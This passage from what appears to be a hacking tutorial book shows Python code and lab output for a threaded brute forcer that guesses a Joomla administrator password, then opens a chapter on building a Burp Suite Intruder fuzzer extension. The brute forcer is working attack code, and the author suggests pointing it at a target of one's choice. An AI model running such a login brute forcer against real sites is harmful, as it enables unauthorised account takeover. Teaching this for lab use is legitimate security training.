self.found = True
Web Hackery 71
print "[*] Bruteforce successful."
print "[*] Username: %s" % username
print "[*] Password: %s" % brute
print "[*] Waiting for other threads to exit..."
This is our primary brute-forcing class, which will handle all of the
HTTP requests and manage cookies for us. After we grab our password
attempt, we set up our cookie jar u using the FileCookieJar class that will
store the cookies in the cookies file. Next we initialize our urllib2 opener,
passing in the initialized cookie jar, which tells urllib2 to pass off any
cookies to it. We then make the initial request to retrieve the login form.
When we have the raw HTML, we pass it off to our HTML parser and call
its feed method v, which returns a dictionary of all of the retrieved form
elements. After we have successfully parsed the HTML, we replace the
username and password fields with our brute-forcing attempt w. Next we
URL encode the POST variables x, and then pass them in our subsequent
HTTP request. After we retrieve the result of our authentication attempt,
we test whether the authentication was successful or not y. Now let’s imple-
ment the core of our HTML processing. Add the following class to your
joomla_killer.py script:
class BruteParser(HTMLParser):
def __init__(self):
HTMLParser.__init__(self)
u self.tag_results = {}
def handle_starttag(self, tag, attrs):
v if tag == "input":
tag_name = None
tag_value = None
for name,value in attrs:
if name == "name":
w tag_name = value
if name == "value":
x tag_value = value
if tag_name is not None:
y self.tag_results[tag_name] = value
This forms the specific HTML parsing class that we want to use
against our target. After you have the basics of using the HTMLParser class,
you can adapt it to extract information from any web application that you
might be attacking. The first thing we do is create a dictionary in which
our results will be stored u. When we call the feed function, it passes in
the entire HTML document and our handle_starttag function is called
whenever a tag is encountered. In particular, we’re looking for HTML
input tags v and our main processing occurs when we determine that
we have found one. We begin iterating over the attributes of the tag, and
72 Chapter 5
if we find the name w or value x attributes, we associate them in the
tag_results dictionary y. After the HTML has been processed, our brute-
forcing class can then replace the username and password fields while
leaving the remainder of the fields intact.
HtmlParser 101
There are three primary methods you can implement when using the HTMLParser
class: handle_starttag, handle_endtag, and handle_data . The handle_starttag
function will be called any time an opening HTML tag is encountered, and the
opposite is true for the handle_endtag function, which gets called each time a
closing HTML tag is encountered . The handle_data function gets called when
there is raw text in between tags . The function prototypes for each function are
slightly different, as follows:
handle_starttag(self, tag, attributes)
handle_endttag(self, tag)
handle_data(self, data)
A quick example to highlight this:
Python rocks!
handle_starttag => tag variable would be "title"
handle_data => data variable would be "Python rocks!"
handle_endtag => tag variable would be "title"
With this very basic understanding of the HTMLParser class, you can do
things like parse forms, find links for spidering, extract all of the pure text for
data mining purposes, or find all of the images in a page .
To wrap up our Joomla brute forcer, let’s copy-paste the build_wordlist
function from our previous section and add the following code:
# paste the build_wordlist function here
words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username,words)
bruter_obj.run_bruteforce()
That’s it! We simply pass in the username and our wordlist to our Bruter
class and watch the magic happen.
Web Hackery 73
Kicking the Tires
If you don’t have Joomla installed into your Kali VM, then you should
install it now. My target VM is at 192.168.112.131 and I am using a wordlist
provided by Cain and Abel,3 a popular brute-forcing and cracking toolset.
I have already preset the username to admin and the password to justin in
the Joomla installation so that I can make sure it works. I then added justin
to the cain.txt wordlist file about 50 entries or so down the file. When run-
ning the script, I get the following output:
$ python2.7 joomla_killer.py
Finished setting up for: admin
Trying: admin : 0racl38 (306697 left)
Trying: admin : !@#$% (306697 left)
Trying: admin : !@#$%^ (306697 left)
--snip--
Trying: admin : 1p2o3i (306659 left)
Trying: admin : 1qw23e (306657 left)
Trying: admin : 1q2w3e (306656 left)
Trying: admin : 1sanjose (306655 left)
Trying: admin : 2 (306655 left)
Trying: admin : justin (306655 left)
Trying: admin : 2112 (306646 left)
[*] Bruteforce successful.
[*] Username: admin
[*] Password: justin
[*] Waiting for other threads to exit...
Trying: admin : 249 (306646 left)
Trying: admin : 2welcome (306646 left)
You can see that it successfully brute-forces and logs in to the Joomla
administrator console. To verify, you of course would manually log in and
make sure. After you test this locally and you’re certain it works, you can use
this tool against a target Joomla installation of your choice.
3. Cain and Abel: http://www.oxid.it/cain.html
74 Chapter 5
6
e x tenDing BUrP Prox y
If you’ve ever tried hacking a web application, you
likely have used Burp Suite to perform spidering,
proxy browser traffic, and carry out other attacks.
Recent versions of Burp Suite include the ability to
add your own tooling, called Extensions, to Burp.
Using Python, Ruby, or pure Java, you can add panels in the Burp GUI
and build automation techniques into Burp Suite. We’re going to take
advantage of this feature and add some handy tooling to Burp for perform-
ing attacks and extended reconnaissance. The first extension will enable
us to utilize an intercepted HTTP request from Burp Proxy as a seed for
creating a mutation fuzzer that can be run in Burp Intruder. The second
extension will interface with the Microsoft Bing API to show us all virtual
hosts located on the same IP address as our target site, as well as any sub-
domains detected for the target domain.
I’m going to assume that you have played with Burp before and that
you know how to trap requests with the Proxy tool, as well as how to send a
trapped request to Burp Intruder. If you need a tutorial on how to do these
tasks, please visit PortSwigger Web Security (http://www.portswigger.net/) to
get started.
I have to admit that when I first started exploring the Burp Extender
API, it took me a few attempts to understand how it worked. I found it a bit
confusing, as I’m a pure Python guy and have limited Java development
experience. But I found a number of extensions on the Burp website that
let me see how other folks had developed extensions, and I used that prior
art to help me understand how to begin implementing my own code. I’m
going to cover some basics on extending functionality, but I’ll also show
you how to use the API documentation as a guide for developing your own
extensions.
setting Up
First, download Burp from http://www.portswigger.net/ and get it ready to go.
As sad as it makes me to admit this, you will require a modern Java instal-
lation, which all operating systems either have packages or installers for.
The next step is to grab the Jython (a Python implementation written in
Java) standalone JAR file; we’ll point Burp to this. You can find this JAR
file on the No Starch site along with the rest of the book’s code (http://www
.nostarch.com/blackhatpython/) or visit the official site, http://www.jython.org/
downloads.html, and select the Jython 2.7 Standalone Installer. Don’t let the
name fool you; it’s just a JAR file. Save the JAR file to an easy-to-remember
location, such as your Desktop.
Next, open up a command-line terminal, and run Burp like so:
#> java -XX:MaxPermSize=1G -jar burpsuite_pro_v1.6.jar
This will get Burp to fire up and you should see its UI full of wonderful
tabs, as shown in Figure 6-1.
Now let’s point Burp at our Jython interpreter. Click the Extender tab,
and then click the Options tab. In the Python Environment section, select
the location of your Jython JAR file, as shown in Figure 6-2.
You can leave the rest of the options alone, and we should be ready to
start coding our first extension. Let’s get rocking!
76 Chapter 6
Figure 6-1: Burp Suite GUI loaded properly
Figure 6-2: Configuring the Jython interpreter location
Extending Burp Proxy 77
Burp Fuzzing
At some point in your career, you may find yourself attacking a web applica-
tion or web service that doesn’t allow you to use traditional web application
assessment tools. Whether working with a binary protocol wrapped inside
HTTP traffic or complex JSON requests, it is critical that you are able to
test for traditional web application bugs. The application might be using
too many parameters, or it’s obfuscated in some way that performing a
manual test would take far too much time. I have also been guilty of run-
ning standard tools that are not designed to deal with strange protocols or
even JSON in a lot of cases. This is where it is useful to be able to leverage
Burp to establish a solid baseline of HTTP traffic, including authentication
cookies, while passing off the body of the request to a custom fuzzer that
can then manipulate the payload in any way you choose. We are going to
work on our first Burp extension to create the world’s simplest web applica-
tion fuzzer, which you can then expand into something more intelligent.
Burp has a number of tools that you can use when you’re performing
web application tests. Typically, you will trap all requests using the Proxy,
and when you see an interesting request go past, you’ll send it to another
Burp tool. A common technique I use is to send them to the Repeater tool,
which lets me replay web traffic, as well as manually modify any interesting
spots. To perform more automated attacks in query parameters, you will
send a request to the Intruder tool, which attempts to automatically figure
out which areas of the web traffic should be modified, and then allows you
to use a variety of attacks to try to elicit error messages or tease out vulner-
abilities. A Burp extension can interact in numerous ways with the Burp
suite of tools, and in our case we’ll be bolting additional functionality onto
the Intruder tool directly.
My first natural instinct is to take a look at the Burp API documenta-
tion to determine what Burp classes I need to extend in order to write
my custom extension. You can access this documentation by clicking the
Extender tab and then the APIs tab. This can look a little daunting because
it looks (and is) very Java-y. The first thing we notice is that the developers
of Burp have aptly named each class so that it’s easy to figure out where we
want to start. In particular, because we’re looking at fuzzing web requests
during an Intruder attack, I see the IIntruderPayloadGeneratorFactory and
IIntruderPayloadGenerator classes. Let’s take a look at what the documenta-
tion says for the IIntruderPayloadGeneratorFactory class:
/**
* Extensions can implement this interface and then call
u * IBurpExtenderCallbacks.registerIntruderPayloadGeneratorFactory()
* to register a factory for custom Intruder payloads.
*/
public interface IIntruderPayloadGeneratorFactory
{
/**
* This method is used by Burp to obtain the name of the payload
* generator. This will be displayed as an option within the
78 Chapter 6
* Intruder UI when the user selects to use extension-generated
* payloads.
*
* @return The name of the payload generator.
*/
v String getGeneratorName();
/**
* This method is used by Burp when the user starts an Intruder
* attack that uses this payload generator.
* @param attack
* An IIntruderAttack object that can be queried to obtain details
* about the attack in which the payload generator will be used.
* @return A new instance of
* IIntruderPayloadGenerator that will be used to generate
* payloads for the attack.
*/
w IIntruderPayloadGenerator createNewInstance(IIntruderAttack attack);
}
The first bit of documentation u tells us to get our extension
registered cor rectly with Burp. We’re going to extend the main Burp
class as well as the IIntruderPayloadGeneratorFactory class. Next we see that
Burp is expect ing two functions to be present in our main class. The
getGeneratorName function v will be called by Burp to retrieve the name of
our extension, and we are expected to return a string. The createNewInstance
function w expects us to return an instance of the IIntruderPayloadGenerator,
which will be a second class that we have to create.
Now let’s implement the actual Python code to meet these require-
ments, and then we’ll look at how the IIntruderPayloadGenerator class gets
added. Open a new Python file, name it bhp_fuzzer.py, and punch out the
following code:
u from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator
from java.util import List, ArrayList
import random
v class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
def registerExtenderCallbacks(self, callbacks):
self._callbacks = callbacks
self._helpers = callbacks.getHelpers()
w callbacks.registerIntruderPayloadGeneratorFactory(self)
return
Extending Burp Proxy 79
x def getGeneratorName(self):
return "BHP Payload Generator"
y def createNewInstance(self, attack):
return BHPFuzzer(self, attack)
So this is the simple skeleton of what we need in order to satisfy the
first set of requirements for our extension. We have to first import the
IBurpExtender class u, which is a requirement for every extension we write.
We follow this up by importing our necessary classes for creating an Intruder
payload generator. Next we define our BurpExtender class v, which extends
the IBurpExtender and IIntruderPayloadGeneratorFactory classes. We then use the
registerIntruderPayloadGeneratorFactory function w to register our class so
that the Intruder tool is aware that we can generate payloads. Next we imple-
ment the getGeneratorName function x to simply return the name of our pay-
load generator. The last step is the createNewInstance function y that receives
the attack parameter and returns an instance of the IIntruderPayloadGenerator
class, which we called BHPFuzzer.
Let’s have a peek at the documentation for the IIntruderPayloadGenerator
class so we know what to implement.
/**
* This interface is used for custom Intruder payload generators.
* Extensions
* that have registered an
* IIntruderPayloadGeneratorFactory must return a new instance of
* this interface when required as part of a new Intruder attack.
*/
public interface IIntruderPayloadGenerator
{
/**
* This method is used by Burp to determine whether the payload
* generator is able to provide any further payloads.
*
* @return Extensions should return
* false when all the available payloads have been used up,
* otherwise true
*/
u boolean hasMorePayloads();
/**
* This method is used by Burp to obtain the value of the next payload.
*
* @param baseValue The base value of the current payload position.
* This value may be null if the concept of a base value is not
* applicable (e.g. in a battering ram attack).
* @return The next payload to use in the attack.
*/
v byte[] getNextPayload(byte[] baseValue);
80 Chapter 6
/**
* This method is used by Burp to reset the state of the payload
* generator so that the next call to
* getNextPayload() returns the first payload again. This
* method will be invoked when an attack uses the same payload
* generator for more than one payload position, for example in a
* sniper attack.
*/
w void reset();
}
Okay! So we need to implement the base class and it needs to expose
three functions. The first function, hasMorePayloads u, is simply there to
decide whether to continue mutated requests back to Burp Intruder.
We’ll just use a counter to deal with this, and once the counter is at the
maximum that we set, we’ll return False so that no more fuzzing cases are
generated. The getNextPayload function v will receive the original payload
from the HTTP request that you trapped. Or, if you have selected multiple
payload areas in the HTTP request, you will only receive the bytes that you
requested to be fuzzed (more on this later). This function allows us to fuzz
the original test case and then return it so that Burp sends the new fuzzed